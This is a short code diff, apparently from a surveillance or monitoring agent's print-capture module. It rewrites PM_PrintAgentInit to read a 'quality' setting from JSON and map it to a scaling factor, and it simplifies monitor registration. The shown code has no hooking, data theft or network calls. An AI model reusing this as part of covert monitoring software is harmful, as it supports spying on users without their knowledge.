@@ -610,34 +610,26 @@ DWORD __stdcall PM_PrintAgentStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_PrintAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_PrintAgentInit(JSONObject elem)
 {
-	DWORD *scaling_factor;
 	print_pool_conf print_conf;
 
 	// Setta lo scaling factor via IPC
-	print_conf.active = bStartFlag;
-	if (conf_ptr) {
-		scaling_factor = (DWORD *)conf_ptr;
-		print_conf.scaling_factor = *scaling_factor;
-	} else {
-		// Inizializza di default a SCALING_FACTOR
-		print_conf.scaling_factor = SCALING_FACTOR;
+	print_conf.active = FALSE;
+	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
+		print_conf.scaling_factor = 2; 
+	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
+		print_conf.scaling_factor = 4;
+	} else { 
+		print_conf.scaling_factor = 6;
 	}
 
 	IPCServerWrite(PM_PRINTAGENT, (BYTE *)&print_conf, sizeof(print_conf));
-	PM_PrintAgentStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_PrintAgentRegister()
 {
-	// Gli hook vengono registrati dalla funzione HM_InbundleHooks.
-	// Non ha funzione di dispatch.
-	AM_MonitorRegister(PM_PRINTAGENT, (BYTE *)NULL, (BYTE *)PM_PrintAgentStartStop, (BYTE *)PM_PrintAgentInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_PrintAgentInit(NULL, FALSE);
+	AM_MonitorRegister(L"print", PM_PRINTAGENT, (BYTE *)NULL, (BYTE *)PM_PrintAgentStartStop, (BYTE *)PM_PrintAgentInit, NULL);
 }
